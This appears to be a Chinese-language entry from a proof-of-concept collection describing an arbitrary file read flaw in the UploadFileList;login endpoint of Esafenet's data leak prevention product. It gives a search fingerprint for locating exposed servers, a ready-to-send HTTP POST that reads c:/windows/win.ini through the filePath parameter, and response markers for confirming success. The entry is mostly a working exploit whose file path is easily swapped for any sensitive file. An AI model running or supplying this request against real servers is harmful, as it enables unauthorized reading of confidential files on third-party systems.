﻿# 亿赛通 数据泄露防护 UploadFileList login接口任意文件读取漏洞

> 更新时间：2024-02-26

> 漏洞编号：

> 漏洞说明：亿赛通-数据泄露防护是一款专门防止您的私人数据资产在分享、存储过程中，被他人非法窃取或使用的安全产品。亿赛通-数据泄露防护(DLP)UploadFileList;login接口存在任意文件读取漏洞，可通过此漏洞获取服务器敏感信息。

> 漏洞特征：body="/CDGServer3/index.jsp"

> 验证脚本：HTTP

```
POST /CDGServer3/document/UploadFileList;login HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded

command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=hello
```

> 响应代码特征：200

> 响应内容特征：app

> 上传文件定位：

> 验证文件来源：亿赛通 数据泄露防护 UploadFileList login接口任意文件读取漏洞 .poc